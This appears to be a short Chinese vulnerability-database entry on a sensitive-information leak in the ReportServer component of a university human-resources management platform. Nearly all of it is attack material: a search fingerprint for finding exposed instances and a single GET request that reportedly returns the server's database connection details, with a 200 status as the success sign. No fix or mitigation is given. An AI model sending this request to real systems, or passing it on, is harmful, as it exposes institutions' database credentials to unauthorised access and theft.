# 大学高校人力资源管理服务平台系统ReportServer存在敏感信息泄露漏洞

大学高校人力资源管理服务平台系统 ｜ 信息泄露 ｜ —
- **指纹**：`body="FM_SYS_ID"`
- **请求**：`GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1`
- **响应特征**：200